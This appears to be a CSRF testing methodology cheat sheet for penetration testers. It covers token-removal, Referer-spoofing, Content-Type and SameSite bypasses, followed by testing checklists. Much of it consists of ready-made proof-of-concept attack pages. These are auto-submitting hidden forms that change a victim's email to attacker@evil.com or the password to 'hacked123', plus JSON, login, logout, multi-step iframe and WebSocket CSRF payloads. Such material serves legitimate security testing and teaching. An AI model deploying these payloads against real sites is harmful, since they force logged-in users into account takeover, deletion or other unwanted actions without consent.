# Cross-Site Request Forgery (CSRF) Testing Methodology

## Quick Reference

**CSRF Token Bypass Checklist:**
1. Remove token entirely
2. Use empty token
3. Use token from another session
4. Change HTTP method
5. Change Content-Type

---

## CSRF Basics

CSRF forces authenticated users to execute unwanted actions. Requires:
1. Relevant action (state-changing)
2. Cookie-based session handling
3. No unpredictable parameters

---

## Identifying CSRF Vulnerabilities

### High-Value Targets

```
- Password/email change
- Money transfer
- Account deletion
- Admin actions
- Settings modification
- Profile updates
```

### Check for Protections

1. **CSRF Token** - Random token in request
2. **SameSite Cookie** - Cookie attribute
3. **Referer/Origin Check** - Header validation
4. **Custom Headers** - Required header check

---

## Bypass Techniques

### Token Removal

Simply remove the CSRF token:
```html
<!-- Original -->
<input type="hidden" name="csrf_token" value="abc123">

<!-- Modified - token removed -->
<!-- No token at all -->
```

### Empty Token

```html
<input type="hidden" name="csrf_token" value="">
```

### Token from Different Session

Use your own valid token for another user.

### Token Reuse

Check if tokens can be reused across requests.

### Static/Predictable Token

Check if token is:
- Same for all users
- Based on predictable values
- Based on session ID

### Token in Cookie (Double Submit)

If token only validated against cookie:
```
Cookie: csrf=abc123
Body: csrf_token=abc123

# Attacker sets cookie via subdomain XSS
Cookie: csrf=attacker_value
Body: csrf_token=attacker_value
```

### Method Override

```html
<!-- Change POST to GET -->
<img src="https://target.com/action?param=value">

<!-- Or use method override -->
<form action="https://target.com/action?_method=DELETE" method="POST">
```

### Content-Type Change

If JSON endpoint:
```html
<!-- Change to form submission -->
<form action="https://target.com/api/action" method="POST"
      enctype="text/plain">
  <input name='{"action":"delete","id":"' value='123"}'>
</form>
```

This sends: `{"action":"delete","id":"=123"}`

### Referer Bypass

**Remove Referer:**
```html
<meta name="referrer" content="no-referrer">
<form action="https://target.com/action" method="POST">
```

**Match validation:**
```
# If checking contains "target.com"
Referer: https://attacker.com/target.com/page

# If checking ends with "target.com"
Referer: https://attackertarget.com/page
```

### Origin Bypass

Origin header harder to bypass, but:
- Some browsers don't send for same-origin
- May not be checked on all endpoints

---

## CSRF PoC Templates

### Basic Form

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" action="https://target.com/action" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Auto-Submit with Hidden iframe

```html
<!DOCTYPE html>
<html>
<body>
  <iframe style="display:none" name="csrf-frame"></iframe>
  <form id="csrf" action="https://target.com/action" method="POST" target="csrf-frame">
    <input type="hidden" name="password" value="hacked123">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### JSON CSRF

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf" action="https://target.com/api/action" method="POST"
        enctype="text/plain">
    <input name='{"email":"attacker@evil.com","x":"' value='"}'>
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Result: `{"email":"attacker@evil.com","x":"="}`

### GET Request via Image

```html
<img src="https://target.com/action?param=value" style="display:none">
```

### XHR (if CORS misconfigured)

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/action", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({action: "delete"}));
```

---

## SameSite Cookie Bypass

### SameSite=Lax Bypass

Lax allows GET requests from cross-site navigation:

```html
<!-- Top-level navigation -->
<a href="https://target.com/action?delete=1">Click me</a>

<!-- Or via JavaScript -->
<script>window.location = "https://target.com/action?delete=1";</script>
```

### SameSite=None Requirement

If `SameSite=None`, cookie sent cross-site but requires `Secure`.

### Browser Defaults

- Chrome 80+: Defaults to Lax
- Firefox 69+: Defaults to Lax
- Older browsers: No restriction

---

## Login CSRF

Force victim to login as attacker:

```html
<form id="csrf" action="https://target.com/login" method="POST">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="attacker_password">
</form>
<script>document.getElementById('csrf').submit();</script>
```

Then victim's actions are logged in attacker's account.

---

## Logout CSRF

Force victim logout:

```html
<img src="https://target.com/logout">
```

---

## Multi-Step CSRF

For multi-step processes:

```html
<iframe id="step1" src="about:blank" style="display:none"></iframe>
<iframe id="step2" src="about:blank" style="display:none"></iframe>

<script>
// Step 1
var form1 = document.createElement('form');
form1.action = 'https://target.com/step1';
form1.method = 'POST';
form1.target = 'step1';
// ... add inputs
document.body.appendChild(form1);
form1.submit();

// Wait and do step 2
setTimeout(function() {
  var form2 = document.createElement('form');
  form2.action = 'https://target.com/step2';
  form2.method = 'POST';
  form2.target = 'step2';
  // ... add inputs
  document.body.appendChild(form2);
  form2.submit();
}, 2000);
</script>
```

---

## CSRF via WebSocket

If WebSocket doesn't verify origin:

```javascript
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
  ws.send(JSON.stringify({action: "delete_account"}));
};
```

---

## CSRF via Flash (Legacy)

For older systems:
```
crossdomain.xml allowing * or attacker domain
```

---

## Testing Checklist

### Token Analysis

- [ ] Is token present?
- [ ] Is token validated?
- [ ] Is token tied to session?
- [ ] Can token be reused?
- [ ] Is token predictable?

### Request Analysis

- [ ] Does action work via GET?
- [ ] Does action work without token?
- [ ] Does action work with empty token?
- [ ] Can Content-Type be changed?

### Cookie Analysis

- [ ] Is SameSite set?
- [ ] Is SameSite=Strict or Lax?
- [ ] Is cookie Secure?

### Header Analysis

- [ ] Is Referer checked?
- [ ] Can Referer be spoofed/omitted?
- [ ] Is Origin checked?

---

## Verification Checklist

1. **Identify state-changing actions:**
   - [ ] List sensitive actions
   - [ ] Check for CSRF protections

2. **Test token bypass:**
   - [ ] Remove token
   - [ ] Empty token
   - [ ] Cross-session token

3. **Test other bypasses:**
   - [ ] Method change
   - [ ] Content-Type change
   - [ ] Referer manipulation

4. **Create PoC:**
   - [ ] Build working exploit page
   - [ ] Test in different browser

5. **Document evidence:**
   - [ ] PoC HTML file
   - [ ] Screenshot of action executed
   - [ ] Impact description
